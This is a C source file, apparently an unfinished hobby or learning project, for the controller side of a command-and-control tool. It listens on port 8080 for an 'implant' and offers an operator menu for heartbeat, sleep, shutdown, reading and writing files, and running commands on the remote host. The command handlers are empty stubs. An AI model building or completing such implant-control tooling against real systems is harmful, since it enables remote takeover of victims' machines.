#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <string.h>

#include "protocol.h"

void display_prompt()
{

    printf("Select a command:\n");
    printf("  1 - HEARTBEAT\n");
    printf("  2 - SET_SLEEP\n");
    printf("  3 - SHUTDOWN\n");
    printf("  4 - READ_DATA\n");
    printf("  5 - WRITE_DATA\n");
    printf("  6 - RUN_CMD\n");
    printf("> ");
}

int get_user_input()
{

    int choice;
    while (1)
    {

        char input_buffer[32];

        display_prompt();

        if (fgets(input_buffer, sizeof(input_buffer), stdin) == NULL)
        {
            printf("\n");
            printf("Input error. Try again. \n");
            continue;
        }

        if ((sscanf(input_buffer, "%d", &choice) == 1) && (choice >= 1 && choice <= 6))
        {
            break;
        }

        printf("INVALID INPUT! Please enter an interger from 1-6. \n");
    }

    return choice;
}

int main(int argc, char *argv[])
{

    int controller_fd = socket(AF_INET, SOCK_STREAM, 0);

    if (controller_fd < 0)
    {
        perror("socket");
        return 0;
    }

    struct sockaddr_in server_ip_structure;
    memset(&server_ip_structure, 0, sizeof(server_ip_structure));
    server_ip_structure.sin_family = AF_INET;
    server_ip_structure.sin_port = htons(8080);
    server_ip_structure.sin_addr.s_addr = INADDR_ANY;

    if (bind(controller_fd, (struct sockaddr *)&server_ip_structure, sizeof(server_ip_structure)) < 0)
    {

        perror("bind");
        close(controller_fd);
        return 0;
    }

    printf("<Controller Listening on port: %d> \n", ntohs(server_ip_structure.sin_port));

    if (listen(controller_fd, 2) < 0)
    { // listening on port 8080

        perror("listen");
        close(controller_fd);
        return 0;
    }

    struct sockaddr_in client_ip_structure;
    int client_fd;
    socklen_t size_of_client = sizeof(client_ip_structure);

    if ((client_fd = accept(controller_fd, (struct sockaddr *)&client_ip_structure, &size_of_client)) < 0) // This is blocking
    {

        perror("accept");
        close(controller_fd);
        return 0;
    }

    printf("<Succesfully established connection to implant, now waiting for HELLO............\n");

    // wait for HELLO from implant, them move onto giving the choice for the user

    while (1)
    { // while true, as we want the connection to last until we set a

        // scanf here

        Command user_choice = get_user_input();

        printf("%d", user_choice);

        switch (user_choice)
        {

        case COMMAND_HEARTBEAT:

            // no payload

        case COMMAND_READ_DATA:

            // payload is the path of the file to read from

        case COMMAND_WRITE_DATA:

            // need to craft the payload for the user, so give an option for the path and contents

        case COMMAND_RUN_CMD:

            // payload is the command

        case COMMAND_SET_SLEEP:

            // payload is the seconds we sleep for

        case COMMAND_SHUTDOWN:

            // no payload

        default:
        }
    }

    close(controller_fd);

    return 0;
}
